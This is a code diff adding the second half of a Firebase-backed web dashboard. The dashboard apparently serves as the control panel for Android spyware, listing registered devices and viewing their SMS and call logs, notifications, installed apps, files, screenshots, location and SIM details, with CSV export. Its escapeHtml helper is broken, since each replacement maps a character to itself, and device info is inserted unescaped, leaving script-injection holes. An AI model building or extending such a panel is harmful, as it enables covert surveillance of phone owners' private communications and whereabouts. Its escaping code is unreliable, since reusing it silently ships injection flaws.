+                        <td class="px-6 py-4 text-gray-300 max-w-md">${escapeHtml(notif.content)}</td>
+                        <td class="px-6 py-4 text-gray-400">${formatTimestamp(notif.timestamp, true)}</td>
+                    </tr>
+                `,
+                (notif) => ({
+                    app: notif.appName,
+                    title: notif.title,
+                    content: notif.content,
+                    time: new Date(notif.timestamp).toLocaleString()
+                }),
+                'No notification logs found for this device.'
+            );
+        }
+        
+        function renderDeviceInfo(info, uid) {
+             const infoItems = {
+                "Device Model": info.model,
+                "Android Version": info.androidVersion,
+                "IP Address": info.ipAddress,
+                "SIM Info": info.simInfo,
+                "Registration Time": formatTimestamp(info.registrationTime, true),
+                "Device UID": uid
+            };
+            
+            contentContainer.innerHTML = `
+                <div class="content-page">
+                    <h2 class="text-3xl font-bold text-white mb-6 flex items-center gap-3"><i class="fas fa-info-circle text-cyan-400"></i> Device Information</h2>
+                    <div class="bg-gray-800 rounded-lg shadow-lg max-w-2xl">
+                        <ul id="device-info-list" class="divide-y divide-gray-700">
+                        ${Object.entries(infoItems).map(([key, value]) => `
+                            <li class="px-6 py-4 flex justify-between items-center">
+                                <span class="font-medium text-gray-300">${key}</span>
+                                <span class="text-gray-100 font-mono text-sm">${value || 'N/A'}</span>
+                            </li>
+                        `).join('')}
+                        </ul>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function renderEmptyStateForDetailPages() {
+            contentContainer.innerHTML = `
+                <div class="text-center py-20">
+                    <i class="fas fa-satellite-dish fa-4x text-gray-600 mb-4"></i>
+                    <h3 class="text-2xl font-bold text-white">No Device Selected</h3>
+                    <p class="text-gray-400 mt-2">Please select a device from the dropdown above to view its data.</p>
+                    <p class="text-gray-500 mt-1 text-sm">If no devices appear, none are registered with the service yet.</p>
+                </div>
+            `;
+        }
+
+        // --- 9. UI HELPERS & EVENT HANDLERS ---
+        
+        function setupEventListeners() {
+            deviceSelector.addEventListener('change', (e) => {
+                state.selectedDeviceUid = e.target.value;
+                renderCurrentView();
+            });
+            
+            sidebarToggle.addEventListener('click', () => {
+                sidebar.classList.toggle('collapsed');
+                if (window.innerWidth >= 768) { // md breakpoint
+                    mainContent.classList.toggle('sidebar-open', !sidebar.classList.contains('collapsed'));
+                    mainContent.classList.toggle('sidebar-collapsed', sidebar.classList.contains('collapsed'));
+                }
+            });
+            
+            // Handle responsive sidebar behavior
+            window.addEventListener('resize', () => {
+                 if (window.innerWidth < 768) {
+                    sidebar.classList.add('collapsed');
+                    mainContent.classList.remove('sidebar-open', 'sidebar-collapsed');
+                    mainContent.style.marginLeft = '0';
+                 } else {
+                    mainContent.classList.toggle('sidebar-open', !sidebar.classList.contains('collapsed'));
+                    mainContent.classList.toggle('sidebar-collapsed', sidebar.classList.contains('collapsed'));
+                 }
+            });
+             // Initial check
+            if (window.innerWidth < 768) {
+                sidebar.classList.add('collapsed');
+                mainContent.style.marginLeft = '0';
+            } else {
+                 mainContent.classList.add('sidebar-open');
+            }
+        }
+        
+        function handleEditAlias(e) {
+            const button = e.currentTarget;
+            const uid = button.dataset.uid;
+            const textSpan = button.previousElementSibling;
+            const currentAlias = textSpan.textContent;
+
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.value = currentAlias;
+            input.className = 'bg-gray-600 text-white p-1 rounded-md focus:outline-none focus:ring-2 focus:ring-cyan-500';
+            
+            const parent = textSpan.parentElement;
+            parent.replaceChild(input, textSpan);
+            input.focus();
+            
+            const saveAlias = () => {
+                const newAlias = input.value.trim();
+                if (newAlias && newAlias !== currentAlias) {
+                    const aliasRef = db.ref(`devices/${uid}/info/alias`);
+                    aliasRef.set(newAlias)
+                        .then(() => console.log('Alias updated!'))
+                        .catch(err => console.error('Failed to update alias:', err));
+                }
+                parent.replaceChild(textSpan, input);
+                 // No need to manually update textSpan.textContent, the Firebase listener will do it.
+            };
+
+            input.addEventListener('blur', saveAlias);
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    saveAlias();
+                } else if (e.key === 'Escape') {
+                    parent.replaceChild(textSpan, input);
+                }
+            });
+        }
+        
+        function setupSidebar() {
+            const navItems = [
+                { id: 'dashboard', icon: 'fa-tachometer-alt', label: 'Dashboard' },
+                { id: 'device_list', icon: 'fa-list-ul', label: 'Device List' },
+                { type: 'divider' },
+                { id: 'info', icon: 'fa-info-circle', label: 'Device Info' },
+                { id: 'sms', icon: 'fa-comment-dots', label: 'SMS Logs' },
+                { id: 'calls', icon: 'fa-phone', label: 'Call Logs' },
+                { id: 'notifications', icon: 'fa-bell', label: 'Notifications' },
+                { id: 'apps', icon: 'fab fa-android', label: 'Installed Apps' },
+                { id: 'files', icon: 'fa-folder-open', label: 'File Logs' },
+                { id: 'screenshots', icon: 'fa-camera', label: 'Screenshots' },
+                { id: 'location', icon: 'fa-map-marker-alt', label: 'Location' },
+                { id: 'battery', icon: 'fa-battery-half', label: 'Battery' },
+            ];
+
+            sidebarNav.innerHTML = navItems.map(item => {
+                if(item.type === 'divider') {
+                    return `<hr class="border-gray-700 my-2">`;
+                }
+                return `
+                    <a href="#" id="nav-${item.id}" class="flex items-center p-3 text-gray-300 rounded-md hover:bg-gray-700 hover:text-white transition-colors">
+                        <i class="fas ${item.icon} fa-fw w-6"></i>
+                        <span class="ml-4 font-medium sidebar-text">${item.label}</span>
+                    </a>
+                `;
+            }).join('');
+            
+            // Add click listeners to new nav items
+            navItems.forEach(item => {
+                if(item.id) {
+                    document.getElementById(`nav-${item.id}`).addEventListener('click', (e) => {
+                        e.preventDefault();
+                        state.currentView = item.id;
+                        renderCurrentView();
+                    });
+                }
+            });
+        }
+        
+        function updateSidebarActiveState() {
+            document.querySelectorAll('#sidebar-nav a').forEach(link => {
+                link.classList.remove('bg-gray-900', 'text-white');
+                if (link.id === `nav-${state.currentView}`) {
+                    link.classList.add('bg-gray-900', 'text-white');
+                }
+            });
+        }
+        
+        function updateDeviceSelector() {
+            const selected = deviceSelector.value;
+            deviceSelector.innerHTML = ''; // Clear options
+            
+            const uids = Object.keys(state.devices);
+            if (uids.length === 0) {
+                 deviceSelector.innerHTML = '<option>No devices available</option>';
+                 state.selectedDeviceUid = null;
+                 return;
+            }
+
+            uids.forEach(uid => {
+                const alias = state.devices[uid].info?.alias || uid.substring(0, 12) + '...';
+                const option = document.createElement('option');
+                option.value = uid;
+                option.textContent = escapeHtml(alias);
+                deviceSelector.appendChild(option);
+            });
+
+            // Try to preserve selection, or pick first device
+            if (state.selectedDeviceUid && uids.includes(state.selectedDeviceUid)) {
+                deviceSelector.value = state.selectedDeviceUid;
+            } else {
+                state.selectedDeviceUid = uids[0];
+                deviceSelector.value = state.selectedDeviceUid;
+            }
+        }
+        
+        function updateDeviceStatuses() {
+            // This function runs on an interval to update the "last seen" text
+            // without re-rendering the whole table
+            const lastSeenCells = document.querySelectorAll('.last-seen-cell');
+            lastSeenCells.forEach(cell => {
+                const timestamp = parseInt(cell.dataset.timestamp);
+                cell.textContent = formatLastSeen(timestamp);
+            });
+            
+            // Also re-render dashboard to update online count if it's the current view
+            if (state.currentView === 'dashboard') {
+                renderDashboard();
+            }
+        }
+        
+        function showImageModal(url) {
+            const modal = document.getElementById('image-viewer-modal');
+            const img = document.getElementById('fullscreen-image');
+            const closeBtn = document.getElementById('close-modal-button');
+
+            img.src = url;
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+            
+            const closeModal = () => {
+                modal.classList.add('hidden');
+                modal.classList.remove('flex');
+                img.src = '';
+                closeBtn.removeEventListener('click', closeModal);
+                modal.removeEventListener('click', modalCloseHandler);
+            };
+            
+            const modalCloseHandler = (e) => {
+                 if (e.target === modal) {
+                    closeModal();
+                 }
+            };
+
+            closeBtn.addEventListener('click', closeModal);
+            modal.addEventListener('click', modalCloseHandler);
+        }
+
+        // --- 10. FORMATTING & UTILITY FUNCTIONS ---
+        function getAuthErrorMessage(code) {
+            switch (code) {
+                case 'auth/wrong-password':
+                    return 'Incorrect password. Please try again.';
+                case 'auth/user-not-found':
+                    return 'No user found with this email.';
+                case 'auth/invalid-email':
+                    return 'The email address is not valid.';
+                default:
+                    return 'An unknown error occurred. Please try again.';
+            }
+        }
+
+        function isDeviceOnline(status) {
+            if (!status || !status.lastSeen) return false;
+            return (Date.now() - status.lastSeen) < OFFLINE_THRESHOLD;
+        }
+
+        function formatTimestamp(ts, includeTime = false) {
+            if (!ts) return 'N/A';
+            const date = new Date(ts);
+            if(includeTime) return date.toLocaleString();
+            return date.toLocaleDateString();
+        }
+        
+        function formatLastSeen(ts) {
+            if (!ts) return 'Never';
+            const now = new Date();
+            const lastSeenDate = new Date(ts);
+            const seconds = Math.floor((now - lastSeenDate) / 1000);
+
+            if (seconds < 60) return 'Just now';
+            let interval = seconds / 31536000;
+            if (interval > 1) return Math.floor(interval) + " years ago";
+            interval = seconds / 2592000;
+            if (interval > 1) return Math.floor(interval) + " months ago";
+            interval = seconds / 86400;
+            if (interval > 1) return Math.floor(interval) + " days ago";
+            interval = seconds / 3600;
+            if (interval > 1) return Math.floor(interval) + " hours ago";
+            interval = seconds / 60;
+            if (interval > 1) return Math.floor(interval) + " minutes ago";
+            return Math.floor(seconds) + " seconds ago";
+        }
+        
+        function formatDuration(seconds) {
+            if (isNaN(seconds) || seconds < 0) return "0s";
+            const h = Math.floor(seconds / 3600);
+            const m = Math.floor((seconds % 3600) / 60);
+            const s = Math.floor(seconds % 60);
+            let result = '';
+            if (h > 0) result += `${h}h `;
+            if (m > 0) result += `${m}m `;
+            if (s >= 0) result += `${s}s`;
+            return result.trim();
+        }
+        
+        function formatBytes(bytes, decimals = 2) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+        }
+
+        function escapeHtml(str) {
+            if(str === null || str === undefined) return '';
+            return String(str)
+                 .replace(/&/g, "&")
+                 .replace(/</g, "<")
+                 .replace(/>/g, ">")
+                 .replace(/"/g, """)
+                 .replace(/'/g, "'");
+        }
+        
+        function exportToCsv(filename, rows, headers) {
+            if (!rows || !rows.length) {
+                alert("No data to export.");
+                return;
+            }
+            const separator = ',';
+            const csvContent = [
+                headers.join(separator),
+                ...rows.map(row => headers.map(header => {
+                    let cell = row[header] === null || row[header] === undefined ? '' : row[header];
+                    cell = String(cell).replace(/"/g, '""'); // escape double quotes
+                    if (String(cell).includes(separator) || String(cell).includes('\n') || String(cell).includes('"')) {
+                        cell = `"${cell}"`;
+                    }
+                    return cell;
+                }).join(separator))
+            ].join('\n');
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            const link = document.createElement("a");
+            if (link.download !== undefined) {
+                const url = URL.createObjectURL(blob);
+                link.setAttribute("href", url);
+                link.setAttribute("download", filename);
+                link.style.visibility = 'hidden';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }
+        }
+    })();
+    </script>
+
+</body>
+</html>
